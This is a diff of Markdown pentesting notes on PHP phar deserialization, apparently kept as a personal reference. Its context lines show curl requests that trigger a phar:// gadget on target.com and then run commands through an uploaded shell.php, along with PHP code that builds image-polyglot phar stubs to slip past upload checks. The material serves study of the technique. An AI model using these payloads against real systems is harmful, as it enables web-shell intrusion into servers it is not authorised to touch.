@@ -1,12 +1,12 @@
 # php-phar
 
 **Author:** Julien Bongars\
-**Date:** 2026-02-13 01:36:15
+**Date:** 2026-02-13 01:36:15\
 **Path:**
 
 ---
 
-Upload a polyglot PHAR as an image; `phar://` plus a file API (`getimagesize()`) deserializes metadata and fires a gadget.
+link: https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deserialization.html
 
 ## PHP RFI (Smuggling)
 
@@ -192,7 +192,7 @@ curl "http://target.com/index.php?avatar=phar://./uploads/avatars/a1b2c3d4e5f6..
 curl "http://target.com/shell.php?cmd=whoami"
 ```
 
-### Why this needs a phar attack (and simpler attacks fail)
+### Why this needs a phar attack (and simpler attacks fail):
 
 1. Path traversal? Blocked — basename() strips directory components.
 2. LFI / RFI? No include() or require() touches user input.
@@ -203,7 +203,7 @@ curl "http://target.com/shell.php?cmd=whoami"
    file contents, extension whitelist is enforced, filename is
    randomized. You can't upload a .php file.
 
-A phar with a GIF89a stub passes both the MIME check
+BUT: A phar with a GIF89a stub passes both the MIME check
 (finfo sees it as image/gif) and the extension check (.gif).
 When getimagesize() processes "phar://uploads/avatars/abc123.gif",
 it deserializes the metadata — creating a Logger object with
@@ -242,8 +242,3 @@ $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
 $jpeg = file_get_contents('legit.jpg');  // any valid JPEG
 $phar->setStub($jpeg . "<?php __HALT_COMPILER(); ?>");
 ```
-
-## Resources
-
-- [PHP Phar](https://www.php.net/manual/en/book.phar.php) — archive format and `phar://` wrapper
-- [HackTricks — PHAR deserialization](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deserialization.html) — upload + trigger patterns
